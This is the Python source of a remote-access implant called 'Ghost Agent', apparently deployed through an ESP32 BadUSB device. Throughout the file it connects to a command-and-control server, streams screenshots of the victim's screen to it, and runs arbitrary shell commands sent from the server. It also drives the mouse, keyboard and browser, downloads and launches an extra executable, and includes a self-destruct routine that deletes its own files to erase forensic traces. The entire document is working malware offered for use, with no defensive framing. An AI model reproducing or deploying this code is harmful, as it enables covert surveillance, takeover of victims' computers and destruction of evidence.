import time
import base64
import sys
import threading
import io
import os
import json

# Auto-install dependencies jika belum ada
try:
    from PIL import ImageGrab
    import pyautogui
    import requests
    import socketio
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", 
        "pillow", "python-socketio[client]", "requests", "websocket-client", "pyautogui"])
    from PIL import ImageGrab
    import pyautogui
    import requests
    import socketio

# websocket untuk CDP (Chrome DevTools Protocol) — optional
try:
    import websocket
except ImportError:
    websocket = None

pyautogui.FAILSAFE = False

# ============================================================
# KONFIGURASI
# ============================================================
SERVER_URL = "https://esp32-badusb.onrender.com"
HEARTBEAT_INTERVAL = 1.0   # saat
SCREENSHOT_INTERVAL = 2.0  # saat
CDP_PORT = 9222
PINCHTAB_PORT = 4000
PINCHTAB_ACTIVE = False
ws_cdp = None
cdp_msg_id = 1

sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=5)
current_mode = "B"  # Default: Safety Mode (self-destruct jika USB dicabut)
running = True

def print_log(msg):
    print(f"[AGENT] {msg}")

# ============================================================
# KAWALAN PELAYAR (PinchTab / Chrome CDP)
# ============================================================
def download_and_start_pinchtab():
    global PINCHTAB_ACTIVE
    try:
        import subprocess
        temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
        exe_path = os.path.join(temp_dir, 'pinchtab.exe')
        
        print_log("Downloading PinchTab...")
        res = requests.get('https://github.com/pinchtab/pinchtab/releases/latest/download/pinchtab-windows-amd64.exe', timeout=30)
        with open(exe_path, 'wb') as f:
            f.write(res.content)
            
        print_log("Starting PinchTab server...")
        subprocess.Popen([exe_path, "server"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        requests.get(f"http://127.0.0.1:{PINCHTAB_PORT}", timeout=2)
        PINCHTAB_ACTIVE = True
        print_log("PinchTab is active!")
    except Exception as e:
        print_log(f"PinchTab failed: {e}")
        PINCHTAB_ACTIVE = False

def get_chrome_path():
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

def start_cdp_chrome():
    global ws_cdp
    if websocket is None:
        print_log("websocket module not available, skipping CDP.")
        return
    try:
        import subprocess
        chrome_path = get_chrome_path()
        if not chrome_path:
            print_log("Chrome/Edge not found.")
            return

        print_log("Starting headless Chrome with CDP...")
        subprocess.Popen([chrome_path, "--headless", f"--remote-debugging-port={CDP_PORT}", "--remote-allow-origins=*"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        res = requests.get(f"http://127.0.0.1:{CDP_PORT}/json", timeout=5)
        pages = res.json()
        if pages:
            ws_url = pages[0].get("webSocketDebuggerUrl")
            ws_cdp = websocket.WebSocket()
            ws_cdp.connect(ws_url)
            print_log("Connected to Chrome via CDP!")
    except Exception as e:
        print_log(f"CDP Start failed: {e}")

def send_cdp_command(method, params=None):
    global cdp_msg_id, ws_cdp
    if not ws_cdp:
        return
    if params is None:
        params = {}
    msg = {"id": cdp_msg_id, "method": method, "params": params}
    ws_cdp.send(json.dumps(msg))
    cdp_msg_id += 1

def initialize_browser_control():
    download_and_start_pinchtab()
    if not PINCHTAB_ACTIVE:
        start_cdp_chrome()

# ============================================================
# EVENT HANDLER SOCKET.IO
# ============================================================
@sio.event
def connect():
    import socket
    pc_name = socket.gethostname()
    print_log(f"Connected to C2 Server as {pc_name}!")
    sio.emit('identify', {'role': 'agent', 'pc_name': pc_name})

@sio.event
def set_mode(mode):
    global current_mode
    current_mode = mode
    print_log(f"Mode switched to: {current_mode}")

@sio.event
def execute_command(cmd):
    print_log(f"Received Command from C2: {cmd}")
    if cmd.lower() == "test":
        print_log("Executing test command...")
    elif cmd.lower() == "kill":
        print_log("Kill command received. Self-destructing.")
        self_destruct()

@sio.event
def trigger_wipe():
    print_log("WIPE COMMAND RECEIVED FROM DASHBOARD! Erasing all evidence...")
    self_destruct()

@sio.event
def execute_json_command(data):
    print_log(f"Received JSON Command: {data}")
    try:
        action = data.get("action")
        if not action:
            return
        
        # HYBRID BROWSER INTEGRATION
        if action.startswith("pinchtab_"):
            if PINCHTAB_ACTIVE:
                pt_action = action.replace("pinchtab_", "")
                requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/{pt_action}", json=data, timeout=5)
            else:
                if action == "pinchtab_navigate":
                    send_cdp_command("Page.navigate", {"url": data.get("url")})
                elif action == "pinchtab_click":
                    selector = data.get("selector")
                    js = f"document.querySelector('{selector}').click();"
                    send_cdp_command("Runtime.evaluate", {"expression": js})
                elif action == "pinchtab_type":
                    selector = data.get("selector")
                    text = data.get("text")
                    js = f"document.querySelector('{selector}').value = '{text}';"
                    send_cdp_command("Runtime.evaluate", {"expression": js})
            return

        # FALLBACK PYAUTOGUI
        x = data.get("x")
        y = data.get("y")
        text = data.get("text")
        key = data.get("key")

        if action == "click" and x is not None and y is not None:
            pyautogui.click(x=int(x), y=int(y))
        elif action == "move" and x is not None and y is not None:
            pyautogui.moveTo(int(x), int(y))
        elif action == "type" and text:
            pyautogui.typewrite(text)
        elif action == "press" and key:
            pyautogui.press(key)
        elif action == "run":
            cmd = data.get("command")
            if cmd:
                import subprocess
                subprocess.Popen(cmd, shell=True)
    except Exception as e:
        print_log(f"Failed to execute JSON command: {e}")

@sio.event
def disconnect():
    print_log("Disconnected from server.")

# ============================================================
# FUNGSI UTAMA: TANGKAP SKRIN & HANTAR
# ============================================================
def check_internet():
    """Semak sama ada PC ada internet."""
    try:
        requests.get("http://1.1.1.1", timeout=3)
        return True
    except Exception:
        return False

def send_screenshots():
    """Thread latar belakang untuk tangkap skrin dan hantar ke server."""
    global running
    while running:
        try:
            # Cuba sambung semula jika terputus
            if not sio.connected:
                if check_internet():
                    try:
                        sio.connect(SERVER_URL, wait_timeout=10)
                    except Exception:
                        pass

            if sio.connected:
                try:
                    screenshot = ImageGrab.grab()
                    buffer = io.BytesIO()
                    screenshot.thumbnail((1280, 720))
                    screenshot.save(buffer, format="JPEG", quality=60)
                    img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
                    sio.emit('screenshot_data', img_str)
                except Exception as e:
                    print_log(f"Screenshot error: {e}")
            else:
                # Jika tiada internet DAN tiada sambungan socket,
                # cuba hantar screenshot melalui HTTP POST (Hybrid Mode)
                if check_internet():
                    try:
                        screenshot = ImageGrab.grab()
                        buffer = io.BytesIO()
                        screenshot.thumbnail((640, 360))
                        screenshot.save(buffer, format="JPEG", quality=40)
                        img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
                        
                        # Hantar via HTTP sebagai fallback
                        requests.post(
                            f"{SERVER_URL}/api/hybrid_upload",
                            json={"screenshot": img_str},
                            timeout=10
                        )
                        
                        # Ambil arahan yang tertunggak
                        resp = requests.get(f"{SERVER_URL}/api/hybrid_command", timeout=5)
                        cmd_data = resp.json()
                        if cmd_data.get("command"):
                            cmd_str = cmd_data["command"]
                            try:
                                if "{" in cmd_str and "}" in cmd_str:
                                    execute_json_command(json.loads(cmd_str))
                                else:
                                    execute_command(cmd_str)
                            except Exception as ex:
                                print_log(f"Hybrid CMD execution failed: {ex}")
                    except Exception as e:
                        print_log(f"Hybrid HTTP fallback error: {e}")
        except Exception as e:
            print_log(f"Screenshot loop error: {e}")
        
        time.sleep(SCREENSHOT_INTERVAL)

def check_heartbeat_usb():
    """Semak sama ada ESP32 USB masih dicucuk."""
    try:
        import subprocess
        # Check for standard ESP32-S3 USB IDs or generic Arduino/Serial IDs
        # VID_303A is Espressif, VID_2341 is Arduino
        output = subprocess.check_output(
            ['powershell', '-Command', "Get-PnpDevice -PresentOnly | Select-Object -ExpandProperty InstanceId | Select-String 'VID_303A|VID_2341'"],
            stderr=subprocess.DEVNULL
        ).decode('utf-8', errors='ignore')
        
        if "VID_303A" in output or "VID_2341" in output:
            return True
        return False
    except Exception as e:
        # Fallback to true if WMI fails so we don't accidentally kill the agent
        print_log(f"USB Check Failed: {e}")
        return True

def self_destruct():
    """Bunuh agent dan padam jejak (Forensic Wipe)."""
    global running
    print_log("Initiating Self-Destruct & Forensic Wipe Sequence...")
    running = False
    
    try:
        sio.disconnect()
    except Exception:
        pass
        
    try:
        import shutil
        # 1. Padam fail recon/exfiltration yang mungkin ditinggalkan oleh ESP32
        temp_dir = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'sys_report')
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            
        # 2. Bunuh proses dan padam tools tambahan (contoh pinchtab.exe)
        try:
            import subprocess
            subprocess.run(["taskkill", "/F", "/IM", "pinchtab.exe"], capture_output=True)
        except Exception:
            pass
            
        pinchtab_exe = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'pinchtab.exe')
        if os.path.exists(pinchtab_exe):
            os.remove(pinchtab_exe)
            
        # 3. Hasilkan skrip bunuh diri untuk padam ejen ini dari background
        script_path = os.path.abspath(__file__)
        bat_path = os.path.join(os.environ.get('TEMP', ''), 'wipe_ghost.bat')
        
        # Bat script: tunggu 2 saat, padam fail python, padam diri sendiri (bat)
        bat_content = f"""
@echo off
timeout /t 2 /nobreak > NUL
del /f /q "{script_path}"
del /f /q "%~f0"
"""
        with open(bat_path, 'w') as f:
            f.write(bat_content)
            
        # Jalankan bat script di background (detached)
        import subprocess
        subprocess.Popen(bat_path, creationflags=subprocess.CREATE_NO_WINDOW)
        
    except Exception as e:
        print(f"Cleanup error: {e}")
        
    # Bunuh proses Python ini serta-merta
    os._exit(0)

# ============================================================
# MAIN LOOP
# ============================================================
def main_loop():
    global running
    print_log("Ghost Agent Started.")
    
    initialize_browser_control()
    
    # Mulakan thread tangkap skrin
    threading.Thread(target=send_screenshots, daemon=True).start()
    
    while running:
        try:
            # 1. Semak USB Heartbeat
            usb_present = check_heartbeat_usb()
            
            if not usb_present and current_mode == 'B':
                print_log("CRITICAL: ESP32 Unplugged while in Mode B. Self destructing!")
                self_destruct()
                
            # 2. Hantar heartbeat ke C2 server melalui socket
            if sio.connected:
                sio.emit('heartbeat')
                
            time.sleep(HEARTBEAT_INTERVAL)
            
        except KeyboardInterrupt:
            running = False
            break
        except Exception as e:
            print_log(f"Main loop error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Cuba sambung berulang kali sehingga berjaya
    max_retries = 10
    for attempt in range(max_retries):
        try:
            print_log(f"Connecting to C2... (Attempt {attempt + 1}/{max_retries})")
            sio.connect(SERVER_URL, wait_timeout=10)
            main_loop()
            break
        except Exception as e:
            print_log(f"Connection failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(5)
            else:
                print_log("All connection attempts failed. Running in offline mode...")
                main_loop()
